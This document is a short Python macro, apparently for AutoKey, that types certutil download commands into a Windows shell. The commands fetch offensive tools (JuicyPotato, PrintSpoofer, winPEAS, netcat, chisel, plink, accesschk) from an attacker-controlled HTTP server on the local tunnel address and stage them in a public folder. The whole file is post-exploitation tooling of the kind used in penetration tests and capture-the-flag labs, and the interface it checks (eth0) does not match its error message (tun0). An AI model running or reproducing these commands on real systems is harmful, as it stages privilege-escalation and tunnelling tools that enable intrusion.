import netifaces as ni


try:
  ni.ifaddresses('eth0')
  tun_ip = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']

except ValueError:
  dialog.info_dialog('tun0 not found', 'Can not obtain tun0 IP. Is the device connected?')

else:
    keyboard.send_keys("certutil.exe -urlcache -split -f http://" + tun_ip + "/accesschk.exe C:\\Users\\Public\\Documents\\accesschk.exe")

    keyboard.send_keys("certutil.exe -urlcache -split -f http://" + tun_ip + "/chisel.exe C:\\Users\\Public\\Documents\\chisel.exe")
    keyboard.send_keys("<enter>")

    keyboard.send_keys("certutil.exe -urlcache -split -f http://" + tun_ip + "/icacls.exe C:\\Users\\Public\\Documents\\icacls.exe")
    keyboard.send_keys("<enter>")

    keyboard.send_keys("certutil.exe -urlcache -split -f http://" + tun_ip + "/JuicyPotato.exe C:\\Users\\Public\\Documents\\JuicyPotato.exe")
    keyboard.send_keys("<enter>")

    keyboard.send_keys("certutil.exe -urlcache -split -f http://" + tun_ip + "/nc.exe C:\\Users\\Public\\Documents\\nc.exe")
    keyboard.send_keys("<enter>")

    keyboard.send_keys("certutil.exe -urlcache -split -f http://" + tun_ip + "/plink.exe C:\\Users\\Public\\Documents\\plink.exe")
    keyboard.send_keys("<enter>")

    keyboard.send_keys("certutil.exe -urlcache -split -f http://" + tun_ip + "/PrintSpoofer.exe C:\\Users\\Public\\Documents\\PrintSpoofer.exe")
    keyboard.send_keys("<enter>")

    keyboard.send_keys("certutil.exe -urlcache -split -f http://" + tun_ip + "/winPEASany.exe C:\\Users\\Public\\Documents\\winPEASany.exe")
    keyboard.send_keys("<enter>")